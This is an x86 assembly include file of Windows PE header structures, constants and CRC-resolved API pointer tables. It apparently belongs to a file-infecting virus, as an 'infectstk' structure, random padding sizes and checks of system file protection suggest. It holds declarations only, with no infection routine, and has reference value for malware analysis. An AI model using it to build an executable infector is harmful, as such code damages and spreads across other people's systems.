   MAX_PATH                        equ     260

   FILE_ATTRIBUTE_DIRECTORY        equ     00000010h

   CREATE_ALWAYS                   equ     2
   OPEN_EXISTING                   equ     3

   GENERIC_WRITE                   equ     40000000h
   GENERIC_READ                    equ     80000000h

   SW_HIDE                         equ     0

   GMEM_FIXED                      equ     0
   GMEM_ZEROINIT                   equ     40h

   STATUS_TIMEOUT                  equ     102h
   WAIT_TIMEOUT                    equ     STATUS_TIMEOUT

   PROCESS_VM_READ                 equ     10h

   EVENT_MODIFY_STATE              equ     2
   SYNCHRONIZE                     equ     100000h

   DRIVE_FIXED                     equ     3
   DRIVE_REMOTE                    equ     4

   IMAGE_FILE_MACHINE_I386         equ     14ch    ;14d/14e do not exist.  if you don't believe, then try it

   IMAGE_FILE_RELOCS_STRIPPED      equ     0001h
   IMAGE_FILE_EXECUTABLE_IMAGE     equ     0002h
   IMAGE_FILE_32BIT_MACHINE        equ     0100h
   IMAGE_FILE_SYSTEM               equ     1000h
   IMAGE_FILE_DLL                  equ     2000h
   IMAGE_FILE_UP_SYSTEM_ONLY       equ     4000h

   IMAGE_SUBSYSTEM_WINDOWS_GUI     equ     2
   IMAGE_SUBSYSTEM_WINDOWS_CUI     equ     3

   SECTION_MAP_WRITE               equ     0002h

   FILE_MAP_WRITE                  equ     SECTION_MAP_WRITE

   PAGE_READWRITE                  equ     04

   SLEEPLEN                        equ     01
   TIMEOUT                         equ     03 ;seconds to wait for remote process to signal
                                              ;should be >= INT((SLEEPLEN * 2.5) + 0.5)

   RANDPADMIN                      equ     4096
   RANDPADMAX                      equ     2048 ;RANDPADMIN is added to this

   align           1                               ;byte-packed structures
   expcrcstk       struct
           pWriteFile                      dd      ?
           pWinExec                        dd      ?
           pSetFileAttributesA             dd      ?
           pMoveFileA                      dd      ?
           pGlobalFree                     dd      ?
           pGlobalAlloc                    dd      ?
           pGetWindowsDirectoryA           dd      ?
           pGetTickCount                   dd      ?
           pGetTempFileNameA               dd      ?
           pGetFileAttributesA             dd      ?
           pDeleteFileA                    dd      ?
           pCreateFileA                    dd      ?
           pCloseHandle                    dd      ?
   expcrcstk       ends
   expcrc_count    equ     size expcrcstk shr 2

   krncrcstk       struct
           kWaitForSingleObject    dd      ?
           kUnmapViewOfFile        dd      ?
           kSleep                  dd      ?
           kSetFileTime            dd      ?
           kSetFileAttributesW     dd      ?
           kSetFileAttributesA     dd      ?
           kSetEvent               dd      ?
           kSetCurrentDirectoryW   dd      ?
           kSetCurrentDirectoryA   dd      ?
           kResetEvent             dd      ?
           kReadProcessMemory      dd      ?
           kOpenProcess            dd      ?
           kOpenEventA             dd      ?
           kMultiByteToWideChar    dd      ?
           kMapViewOfFile          dd      ?
           kLoadLibraryA           dd      ?
           kGlobalFree             dd      ?
           kGlobalAlloc            dd      ?
           kGetVersion             dd      ?
           kGetTickCount           dd      ?
           kGetStartupInfoA        dd      ?
           kGetFullPathNameW       dd      ?
           kGetFullPathNameA       dd      ?
           kGetDriveTypeA          dd      ?
           kGetCurrentProcessId    dd      ?
           kGetCommandLineA        dd      ?
           kFindNextFileW          dd      ?
           kFindNextFileA          dd      ?
           kFindFirstFileW         dd      ?
           kFindFirstFileA         dd      ?
           kFindClose              dd      ?
           kCreateThread           dd      ?
           kCreateProcessA         dd      ?
           kCreateFileMappingA     dd      ?
           kCreateFileW            dd      ?
           kCreateFileA            dd      ?
           kCreateEventA           dd      ?
           kCloseHandle            dd      ?
   krncrcstk       ends
   krncrc_count    equ     size krncrcstk shr 2

   sfccrcstk       struct
           sSfcIsFileProtected     dd      ?
   sfccrcstk       ends
   sfccrc_count    equ     size sfccrcstk shr 2

   startupinfo     struct
           sicb                    dd      ?
           siReserved              dd      ?
           siDesktop               dd      ?
           siTitle                 dd      ?
           sidwX                   dd      ?
           sidwY                   dd      ?
           sidwXSize               dd      ?
           sidwYSize               dd      ?
           sidwXCountChars         dd      ?
           sidwYCountChars         dd      ?
           sidwFillAttribute       dd      ?
           sidwFlags               dd      ?
           siwShowWindow           dw      ?
           sicbReserved2           dw      ?
           silpReserved2           dd      ?
           sihStdInput             dd      ?
           sihStdOutput            dd      ?
           sihStdError             dd      ?
   startupinfo     ends

   processinfo     struct
           pihProcess      dd      ?
           pihThread       dd      ?
           pidwProcessId   dd      ?
           pidwThreadId    dd      ?
   processinfo     ends

   coffhdr         struct
           pemachine       dw      ?               ;04
           pesectcount     dw      ?               ;06
           petimedate      dd      ?               ;08
           pesymbrva       dd      ?               ;0C
           pesymbcount     dd      ?               ;10
           peopthdrsize    dw      ?               ;14
           peflags         dw      ?               ;16
   coffhdr         ends

   pedir           struct
           dirrva          dd      ?
           dirsize         dd      ?
   pedir           ends

   pehdr           struct
           pesig           dd      ?               ;00
           pecoff          coffhdr <?>
           pemagic         dw      ?               ;18
           pemajorlink     db      ?               ;1A
           peminorlink     db      ?               ;1B
           pecodesize      dd      ?               ;1C
           peidatasize     dd      ?               ;20
           peudatasize     dd      ?               ;24
           peentrypoint    dd      ?               ;28
           pecodebase      dd      ?               ;2C
           pedatabase      dd      ?               ;30
           peimagebase     dd      ?               ;34
           pesectalign     dd      ?               ;38
           pefilealign     dd      ?               ;3C
           pemajoros       dw      ?               ;40
           peminoros       dw      ?               ;42
           pemajorimage    dw      ?               ;44
           peminorimage    dw      ?               ;46
           pemajorsubsys   dw      ?               ;48
           peminorsubsys   dw      ?               ;4A
           pereserved      dd      ?               ;4C
           peimagesize     dd      ?               ;50
           pehdrsize       dd      ?               ;54
           pechksum        dd      ?               ;58
           pesubsys        dw      ?               ;5C
           pedllflags      dw      ?               ;5E
           pestackmax      dd      ?               ;60
           pestacksize     dd      ?               ;64
           peheapmax       dd      ?               ;68
           peheapsize      dd      ?               ;6C
           peldrflags      dd      ?               ;70
           pervacount      dd      ?               ;74
           peexport        pedir   <?>             ;78
           peimport        pedir   <?>             ;80
           persrc          pedir   <?>             ;88
           peexcpt         pedir   <?>             ;90
           pesecurity      pedir   <?>             ;98
           pereloc         pedir   <?>             ;A0
           pedebug         pedir   <?>             ;A8
           pearch          pedir   <?>             ;B0
           peglobal        pedir   <?>             ;B8
           petls           pedir   <?>             ;C0
           peconfig        pedir   <?>             ;C8
           pebound         pedir   <?>             ;D0
           peiat           pedir   <?>             ;D8
           pedelay         pedir   <?>             ;E0
           pecom           pedir   <?>             ;E8
           persrv          pedir   <?>             ;F0
   pehdr           ends

   peexp           struct
           expflags        dd      ?
           expdatetime     dd      ?
           expmajorver     dw      ?
           expminorver     dw      ?
           expdllrva       dd      ?
           expordbase      dd      ?
           expadrcount     dd      ?
           expnamecount    dd      ?
           expadrrva       dd      ?
           expnamerva      dd      ?
           expordrva       dd      ?
   peexp           ends

   mzhdr           struct
           mzsig           dw      ?               ;00
           mzpagemod       dw      ?               ;02
           mzpagediv       dw      ?               ;04
           mzrelocs        dw      ?               ;06
           mzhdrsize       dw      ?               ;08
           mzminalloc      dw      ?               ;0A
           mzmaxalloc      dw      ?               ;0C
           mzss            dw      ?               ;0E
           mzsp            dw      ?               ;10
           mzchksum        dw      ?               ;12
           mzip            dw      ?               ;14
           mzcs            dw      ?               ;16
           mzreloff        dw      ?               ;18
           mzfiller        db      22h dup (?)     ;1A
           mzlfanew        dd      ?               ;3C
   mzhdr   ends

   FILETIME        struct
           dwLowDateTime   dd      ?
           dwHighDateTime  dd      ?
   FILETIME        ends

   WIN32_FIND_DATA struct
           dwFileAttributes        dd              ?
           ftCreationTime          FILETIME        <?>
           ftLastAccessTime        FILETIME        <?>
           ftLastWriteTime         FILETIME        <?>
           dwFileSizeHigh          dd              ?
           dwFileSizeLow           dd              ?
           dwReserved0             dd              ?
           dwReserved1             dd              ?
           cFileName               dw              260 dup (?)
           cAlternateFileName      dw              14 dup (?)
   WIN32_FIND_DATA ends

   findlist        struct
           findprev        dd                      ?
           findhand        dd                      ?
           finddata        WIN32_FIND_DATA         <?>
   findlist        ends

   sehstruc        struct
           sehkrnlret      dd      ?
           sehexcptrec     dd      ?
           sehprevseh      dd      ?
   sehstruc        ends

   pesect          struct
           sectname        db      8 dup (?)
           sectvirtsize    dd      ?
           sectvirtaddr    dd      ?
           sectrawsize     dd      ?
           sectrawaddr     dd      ?
           sectreladdr     dd      ?
           sectlineaddr    dd      ?
           sectrelcount    dw      ?
           sectlinecount   dw      ?
           sectflags       dd      ?
   pesect          ends

   mapsehstk       struct
           mapsehprev      dd      ?
           mapsehexcpt     dd      ?
           mapsehregs      dd      8 dup (?)
           mapsehsehret    dd      ?
           mapsehinfret    dd      ?
   mapsehstk       ends

   infectstk       struct
           inffilesize     dd              ?
           infseh          mapsehstk       <?>
   infectstk       ends

   align                                           ;restore default alignment
